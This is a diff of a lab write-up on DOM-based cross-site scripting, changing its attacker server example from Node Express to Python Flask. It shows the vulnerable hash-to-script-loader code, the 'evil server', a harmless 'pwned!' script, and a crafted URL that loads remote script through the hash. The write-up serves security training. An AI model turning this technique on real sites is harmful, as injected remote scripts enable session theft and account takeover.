@@ -20,11 +20,11 @@ Now that the app is running let's go hacking!
 
 The application shows no input field or anything else we can interact with. Let's inspect the source code.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/4.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/1.png)
 
 Inspecting the source code of the application.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/5.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/2.png)
 
 ```javascript
 function loadWelcomeMessage() {
@@ -49,58 +49,55 @@ endpoint = location.hash.slice(5);
 
 Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/1.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/3.png)
 
 ## Exploitation
 
 We can start building our malicious server and server the application with our malicious js file.
 
-```javascript
-const express = require("express");
-const app = express();
-const path = require("path");
+```python
+from flask import Flask
 
-app.get("/static/js/welcome.js", function (req, res) {
-  res.sendFile("welcome.js", {
-    root: path.join(__dirname + "/static/js/"),
-  });
-});
+app = Flask(__name__, static_url_path='/static', static_folder='static')
+app.config['DEBUG'] = True
 
-const port = process.env.PORT || 1337;
+@app.route("/<path:path>")
+def static_file(path):
+    return app.send_static_file(path)
 
-app.listen(port, "0.0.0.0", () =>
-  console.log(`Listening on port ${port}...!!!`)
-);
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=1337)
+
 ```
 
-Save the snippet above to &gt; evil_server.js and run the commands below to install some dependencies.
-Of course you can also run your app on whatever service you want it does not have to be nodeJs express.
+Save the snippet above to &gt; evil_server.py and run the commands below to install some dependencies.
+Of course you can also run your app on whatever service you want it does not have to be python flask.
 
 ```text
-$ npm install express
+$ pip3 install flask
 ```
 
 Now we need to create our malicous js file, save the following snippet code into /static/js/welcome.js
 
 ```javascript
-document.getElementsByClassName("panel-body")[0].innerText = "pwned!!!";
+document.getElementsByClassName("panel-body")[0].innerText = "pwned!";
 ```
 
 We are ready to start our server:
 
 ```text
-$ node evil_server.js
+$ python3 evil_server.py
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/2.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/4.png)
 
 Now we can serve our malicious js file to the application
 
 ```text
-http://localhost:5000/#js-xss-dom2xhttp://localhost:1337
+http://0.0.0.0:5000/#xxxxhttp://0.0.0.0:1337
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/3.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/5.png)
 
 ## Additional sources
 
